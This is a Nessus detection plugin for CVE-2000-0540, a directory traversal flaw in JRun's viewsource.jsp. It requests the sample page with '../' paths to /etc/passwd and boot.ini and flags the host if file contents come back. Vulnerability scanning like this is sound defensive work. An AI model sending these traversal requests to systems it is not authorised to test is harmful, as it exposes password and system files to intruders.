#
# (C) Tenable Network Security, Inc.
#

#
# Updated by HDM <hdm@digitaloffense.net> to work for Unix servers
# (also, it seems that JRun runs as r00t on Solaris by default!)
#

#
# Thanks to Scott Clark <quualudes@yahoo.com> for testing this
# plugin and helping me to write a Nessus script in time for
# this problem
#

include("compat.inc");

if(description)
{
 script_id(10444); 
 script_version ("$Revision: 1.25 $");
 script_cve_id("CVE-2000-0540");
 script_bugtraq_id(1386);
 script_xref(name:"OSVDB", value:"2713");
 script_xref(name:"OSVDB", value:"51283");

 script_name(english:"JRun viewsource.jsp Directory Traversal Vulnerability");
 script_summary(english:"Determines the presence of the jrun flaw");
 
 script_set_attribute(
   attribute:"synopsis",
   value:string(
     "A web application on the remote host has a directory traversal\n",
     "vulnerability."
   )
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The verison of JRun on the remote host has a directory traversal\n",
     "vulnerability in the 'source' parameter of viewsource.jsp.  A remote\n",
     "attacker could exploit this to read arbitrary files.  This could be\n",
     "used to read sensitive information, or information that could be used\n",
     "to mount further attacks."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://www.adobe.com/devnet/security/security_zone/asb00-15.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to JRun 2.3.3 or later."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N"
 );
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");

 script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");
 
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 8000);

 exit(0);
}

#
# The script code starts here
#


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


file[0] = "/../../../../../../../../../boot.ini";    res[0] = "boot loader";
file[1] = "/../../../../../../../../../etc/passwd";  res[1] = "root:";

port = get_http_port(default:8000);
banner = get_http_banner(port:port);
if ( "jrun" >!< tolower(banner) ) exit(0);

function check_page(file, pat)
{
  local_var url, r, str;

  url = string("/jsp/jspsamp/jspexamples/viewsource.jsp?source=", file);
  r = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(r)) exit(1, "The server did not respond.");

  if (pat >< r[2])
  {
    security_warning(port:port);
    exit(0);
  }
}


for(i=0;file[i];i=i+1)
{
    check_page(file:file[i], pat:res[i]);
}
